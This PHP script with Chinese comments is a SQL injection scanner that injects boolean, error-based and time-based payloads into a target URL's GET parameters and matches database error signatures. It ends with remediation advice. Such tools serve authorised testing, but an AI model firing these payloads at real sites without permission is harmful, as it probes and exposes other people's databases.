<?php
/**
 * ==============================================================================
 *   SQL 注入检测工具 - sqli_scanner.php
 * ==============================================================================
 *   功能说明：
 *     本脚本用于检测 URL 参数中是否存在 SQL 注入漏洞，
 *     通过多种检测技术判断注入点，用于安全研究和授权测试。
 *
 *   检测技术：
 *     1. 布尔盲注检测（通过页面内容变化判断）
 *     2. 报错注入检测（通过数据库错误信息判断）
 *     3. 时间盲注检测（通过响应时间差异判断）
 *     4. 单引号测试（基础检测）
 *
 *   使用方法：
 *     php sqli_scanner.php <目标URL> [选项]
 *
 *   示例：
 *     // 检测 GET 参数
 *     php sqli_scanner.php "http://example.com/page.php?id=1"
 *
 *     // 指定要检测的参数
 *     php sqli_scanner.php "http://example.com/page.php?id=1&cat=2" --param id
 *
 *     // 检测所有参数
 *     php sqli_scanner.php "http://example.com/page.php?id=1&cat=2&page=3"
 *
 *     // 自定义 Cookie
 *     php sqli_scanner.php "http://example.com/page.php?id=1" --cookie "session=abc"
 *
 *   免责声明：
 *     本脚本仅供安全学习和授权测试使用。
 *     检测基于常见注入特征，可能存在误报和漏报。
 *     请勿对未授权的网站进行注入检测。
 *     使用本脚本造成的一切后果由使用者自行承担。
 * ==============================================================================
 */

// ============================================================
// SQL 注入 Payload 配置
// ============================================================

// 布尔盲注 Payload（正常 vs 异常，用于对比页面差异）
$booleanPayloads = [
    'normal' => [
        ' AND 1=1',       // 恒真条件
        "' AND '1'='1",   // 字符串恒真
    ],
    'abnormal' => [
        ' AND 1=2',       // 恒假条件
        "' AND '1'='2",   // 字符串恒假
    ],
];

// 报错注入 Payload（触发数据库错误）
$errorPayloads = [
    "'",                   // 单引号（最基础）
    "''",                  // 双引号
    "' OR ''='",           // 闭合测试
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x3a,0x3a, (SELECT version()), 0x3a,0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) -- ",
    "' AND 1=CONVERT(int, (SELECT @@version)) -- ",
    "' AND extractvalue(1, concat(0x5c, (select version()))) -- ",
    "' AND updatexml(1, concat(0x5c, (select version())), 1) -- ",
];

// 时间盲注 Payload（通过 sleep 函数延迟响应）
$timePayloads = [
    "' AND SLEEP(3) -- ",           // MySQL
    " AND SLEEP(3) -- ",             // 数字型
    "'; WAITFOR DELAY '0:0:3'-- ",   // SQL Server
    "1' AND pg_sleep(3)-- ",         // PostgreSQL
];

// 常见数据库错误信息特征
$errorSignatures = [
    // MySQL
    'MySQL syntax error',
    'mysql_fetch',
    'mysql_error',
    'You have an error in your SQL syntax',
    'supplied argument is not a valid MySQL',
    // SQL Server
    'Microsoft SQL Server',
    'SQLServer JDBC Driver',
    'Unclosed quotation mark',
    'Syntax error converting',
    // PostgreSQL
    'PostgreSQL',
    'pg_query',
    'pg_exec',
    'syntax error at or near',
    // Oracle
    'ORA-',
    'Oracle error',
    // 通用
    'SQL syntax',
    'Syntax error',
    'unclosed quotation mark',
    'quoted string not properly terminated',
];

// ============================================================
// 打印帮助信息
// ============================================================
function printHelp()
{
    echo "================================================================\n";
    echo "  SQL 注入检测工具 - 安全研究用\n";
    echo "================================================================\n\n";
    echo "用法: php sqli_scanner.php <目标URL> [选项]\n\n";
    echo "参数说明:\n";
    echo "  目标URL         带参数的目标URL（必需）\n";
    echo "  --param <名>    指定要检测的参数名（可选，默认检测所有）\n";
    echo "  --cookie <值>   设置请求 Cookie\n";
    echo "  --timeout <秒>  请求超时时间（默认 10 秒）\n";
    echo "  --help, -h      显示帮助信息\n\n";
    echo "检测技术:\n";
    echo "  1. 单引号基础检测\n";
    echo "  2. 报错注入检测\n";
    echo "  3. 布尔盲注检测\n";
    echo "  4. 时间盲注检测\n\n";
    echo "示例:\n";
    echo "  php sqli_scanner.php \"http://example.com/page.php?id=1\"\n";
    echo "  php sqli_scanner.php \"http://example.com/page.php?id=1\" --param id\n";
    echo "  php sqli_scanner.php \"http://example.com/page.php?id=1\" --cookie \"sid=abc\"\n";
    echo "================================================================\n";
}

// ============================================================
// 发送 HTTP GET 请求
// 参数：
//   $url     - 请求URL
//   $cookie  - Cookie 字符串
//   $timeout - 超时秒数
// 返回：响应体和响应头信息
// ============================================================
function sendRequest($url, $cookie = '', $timeout = 10)
{
    $ch = curl_init();

    // 设置 cURL 选项
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    // 设置 User-Agent
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');

    // 设置 Cookie
    if (!empty($cookie)) {
        curl_setopt($ch, CURLOPT_COOKIE, $cookie);
    }

    // 记录响应头
    curl_setopt($ch, CURLOPT_HEADER, false);

    // 执行请求
    $startTime = microtime(true);
    $response = curl_exec($ch);
    $endTime = microtime(true);

    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $duration = $endTime - $startTime;
    $error = curl_error($ch);

    curl_close($ch);

    return [
        'success'  => ($response !== false),
        'body'     => $response,
        'http_code' => $httpCode,
        'duration' => $duration,
        'error'    => $error,
    ];
}

// ============================================================
// 解析 URL 参数
// ============================================================
function parseUrlParams($url)
{
    $params = [];
    $query = parse_url($url, PHP_URL_QUERY);

    if ($query) {
        parse_str($query, $params);
    }

    return $params;
}

// ============================================================
// 构造带注入参数的 URL
// ============================================================
function buildInjectedUrl($baseUrl, $paramName, $payload)
{
    $urlParts = parse_url($baseUrl);
    if (!$urlParts) {
        return false;
    }

    $params = [];
    if (isset($urlParts['query'])) {
        parse_str($urlParts['query'], $params);
    }

    // 在原参数值后追加 payload
    if (isset($params[$paramName])) {
        $originalValue = $params[$paramName];
        $params[$paramName] = $originalValue . $payload;
    }

    // 重新构建 URL
    $scheme = isset($urlParts['scheme']) ? $urlParts['scheme'] . '://' : 'http://';
    $host = $urlParts['host'] ?? '';
    $port = isset($urlParts['port']) ? ':' . $urlParts['port'] : '';
    $path = $urlParts['path'] ?? '/';
    $query = '?' . http_build_query($params);

    return $scheme . $host . $port . $path . $query;
}

// ============================================================
// 检测数据库报错信息
// ============================================================
function detectError($responseBody)
{
    global $errorSignatures;

    $foundErrors = [];
    $bodyLower = strtolower($responseBody);

    foreach ($errorSignatures as $sig) {
        if (stripos($bodyLower, strtolower($sig)) !== false) {
            $foundErrors[] = $sig;
        }
    }

    return $foundErrors;
}

// ============================================================
// 计算两个页面内容的相似度
// 使用简单的文本差异比例判断
// ============================================================
function calculateSimilarity($text1, $text2)
{
    // 使用相似文本函数（PHP 内置）
    $len1 = strlen($text1);
    $len2 = strlen($text2);

    if ($len1 == 0 && $len2 == 0) {
        return 100;
    }

    // 计算长度差异
    $maxLen = max($len1, $len2);
    if ($maxLen == 0) return 0;

    // 计算内容相似度
    similar_text($text1, $text2, $percent);

    return $percent;
}

// ============================================================
// 检测单个参数的 SQL 注入
// ============================================================
function scanParameter($baseUrl, $paramName, $cookie, $timeout)
{
    global $booleanPayloads, $errorPayloads, $timePayloads;

    $results = [
        'param' => $paramName,
        'vulnerable' => false,
        'methods' => [],
        'details' => [],
    ];

    echo "    [检测] 参数: {$paramName}\n";

    // 获取原始响应（基准）
    $originalResp = sendRequest($baseUrl, $cookie, $timeout);
    if (!$originalResp['success']) {
        echo "      [错误] 请求失败: {$originalResp['error']}\n";
        return $results;
    }

    $originalBody = $originalResp['body'];
    $originalLen = strlen($originalBody);
    $originalTime = $originalResp['duration'];

    echo "      [基准] 响应长度: {$originalLen} 字节, 响应时间: " . round($originalTime, 2) . " 秒\n";

    // ====== 1. 单引号测试 ======
    echo "      [1/4] 单引号测试... ";
    $quoteUrl = buildInjectedUrl($baseUrl, $paramName, "'");
    $quoteResp = sendRequest($quoteUrl, $cookie, $timeout);

    if ($quoteResp['success']) {
        $errors = detectError($quoteResp['body']);
        if (count($errors) > 0) {
            echo "发现报错注入！\n";
            $results['vulnerable'] = true;
            $results['methods'][] = '报错注入';
            $results['details'][] = "单引号触发数据库错误: " . implode(', ', array_slice($errors, 0, 3));
        } else {
            // 检查页面是否有明显变化（可能是布尔盲注）
            $similarity = calculateSimilarity($originalBody, $quoteResp['body']);
            if ($similarity < 80) {
                echo "页面明显变化（可能存在注入）\n";
                $results['details'][] = "单引号导致页面相似度: " . round($similarity, 1) . "%";
            } else {
                echo "未发现明显异常\n";
            }
        }
    } else {
        echo "请求失败\n";
    }

    // ====== 2. 报错注入检测 ======
    echo "      [2/4] 报错注入检测... ";
    $errorFound = false;
    foreach ($errorPayloads as $payload) {
        $errorUrl = buildInjectedUrl($baseUrl, $paramName, $payload);
        $errorResp = sendRequest($errorUrl, $cookie, $timeout);

        if ($errorResp['success']) {
            $errors = detectError($errorResp['body']);
            if (count($errors) > 0) {
                $errorFound = true;
                $results['vulnerable'] = true;
                if (!in_array('报错注入', $results['methods'])) {
                    $results['methods'][] = '报错注入';
                }
                $results['details'][] = "Payload [{$payload}] 触发错误: " . $errors[0];
                break; // 找到一个就够了
            }
        }
    }
    echo $errorFound ? "发现漏洞！\n" : "未发现\n";

    // ====== 3. 布尔盲注检测 ======
    echo "      [3/4] 布尔盲注检测... ";
    $boolVuln = false;

    // 测试多组 payload
    for ($i = 0; $i < min(count($booleanPayloads['normal']), count($booleanPayloads['abnormal'])); $i++) {
        $trueUrl = buildInjectedUrl($baseUrl, $paramName, $booleanPayloads['normal'][$i]);
        $falseUrl = buildInjectedUrl($baseUrl, $paramName, $booleanPayloads['abnormal'][$i]);

        $trueResp = sendRequest($trueUrl, $cookie, $timeout);
        $falseResp = sendRequest($falseUrl, $cookie, $timeout);

        if ($trueResp['success'] && $falseResp['success']) {
            // 比较真/假条件下的响应差异
            $trueSimilarity = calculateSimilarity($originalBody, $trueResp['body']);
            $falseSimilarity = calculateSimilarity($originalBody, $falseResp['body']);

            // 真条件更接近原始页面，假条件差异较大 -> 可能存在布尔盲注
            $diff = abs($trueSimilarity - $falseSimilarity);
            if ($diff > 20 && $trueSimilarity > $falseSimilarity) {
                $boolVuln = true;
                $results['vulnerable'] = true;
                $results['methods'][] = '布尔盲注';
                $results['details'][] = "真假条件相似度差异: " . round($diff, 1) . "% (真: " . round($trueSimilarity, 1) . "%, 假: " . round($falseSimilarity, 1) . "%)";
                break;
            }
        }
    }
    echo $boolVuln ? "可能存在！\n" : "未发现\n";

    // ====== 4. 时间盲注检测 ======
    echo "      [4/4] 时间盲注检测... ";
    $timeVuln = false;

    foreach ($timePayloads as $payload) {
        $timeUrl = buildInjectedUrl($baseUrl, $paramName, $payload);
        $timeResp = sendRequest($timeUrl, $cookie, $timeout + 5); // 增加超时容忍

        if ($timeResp['success']) {
            $delay = $timeResp['duration'] - $originalTime;
            // 如果延迟超过 2 秒，可能存在时间盲注
            if ($delay > 2) {
                $timeVuln = true;
                $results['vulnerable'] = true;
                $results['methods'][] = '时间盲注';
                $results['details'][] = "Payload [{$payload}] 延迟: " . round($delay, 2) . " 秒";
                break;
            }
        }
    }
    echo $timeVuln ? "可能存在！\n" : "未发现\n";

    return $results;
}

// ============================================================
// 主程序入口
// ============================================================
function main($argc, $argv)
{
    // 参数检查
    if ($argc < 2 || $argv[1] == '--help' || $argv[1] == '-h') {
        printHelp();
        return;
    }

    $url = $argv[1];
    $targetParam = '';
    $cookie = '';
    $timeout = 10;

    // 解析额外参数
    for ($i = 2; $i < $argc; $i++) {
        switch ($argv[$i]) {
            case '--param':
                if (isset($argv[$i + 1])) {
                    $targetParam = $argv[++$i];
                }
                break;
            case '--cookie':
                if (isset($argv[$i + 1])) {
                    $cookie = $argv[++$i];
                }
                break;
            case '--timeout':
                if (isset($argv[$i + 1])) {
                    $timeout = intval($argv[++$i]);
                }
                break;
        }
    }

    // 验证 URL
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        echo "[错误] 无效的 URL: {$url}\n";
        return;
    }

    echo "\n";
    echo "================================================================\n";
    echo "  SQL 注入检测工具\n";
    echo "================================================================\n\n";
    echo "[信息] 目标URL: {$url}\n";
    if (!empty($cookie)) {
        echo "[信息] Cookie: 已设置\n";
    }
    echo "[信息] 超时时间: {$timeout} 秒\n";
    echo "\n";

    // 解析参数
    $params = parseUrlParams($url);
    if (empty($params)) {
        echo "[错误] URL 中没有找到 GET 参数\n";
        return;
    }

    echo "[信息] 检测到 " . count($params) . " 个参数: " . implode(', ', array_keys($params)) . "\n";
    echo "\n";
    echo "----------------------------------------------------------------\n";
    echo "  开始检测...\n";
    echo "----------------------------------------------------------------\n\n";

    // 确定要检测的参数
    $paramsToScan = [];
    if (!empty($targetParam) && isset($params[$targetParam])) {
        $paramsToScan[] = $targetParam;
    } else {
        $paramsToScan = array_keys($params);
    }

    // 逐个检测参数
    $vulnerableParams = [];
    foreach ($paramsToScan as $param) {
        $result = scanParameter($url, $param, $cookie, $timeout);
        if ($result['vulnerable']) {
            $vulnerableParams[] = $result;
        }
        echo "\n";
    }

    // 输出结果汇总
    echo "================================================================\n";
    echo "  检测结果汇总\n";
    echo "================================================================\n\n";
    echo "  目标URL:     {$url}\n";
    echo "  检测参数数: " . count($paramsToScan) . "\n";
    echo "  存在漏洞:   " . count($vulnerableParams) . " 个参数\n";
    echo "\n";

    if (count($vulnerableParams) > 0) {
        echo "  存在 SQL 注入风险的参数:\n\n";

        foreach ($vulnerableParams as $vp) {
            echo "  [危险] 参数: {$vp['param']}\n";
            echo "         注入类型: " . implode(', ', $vp['methods']) . "\n";
            foreach ($vp['details'] as $detail) {
                echo "         - {$detail}\n";
            }
            echo "\n";
        }

        echo "  修复建议:\n";
        echo "  1. 使用预编译语句（Prepared Statements）\n";
        echo "  2. 使用参数化查询\n";
        echo "  3. 对用户输入进行严格验证和过滤\n";
        echo "  4. 使用 ORM 框架\n";
        echo "  5. 最小权限原则配置数据库账户\n";
    } else {
        echo "  未检测到明显的 SQL 注入漏洞\n";
        echo "  注意：基于特征的检测可能存在漏报，建议结合人工审计\n";
    }

    echo "\n";
    echo "================================================================\n";
}

// 运行主程序
main($argc, $argv);
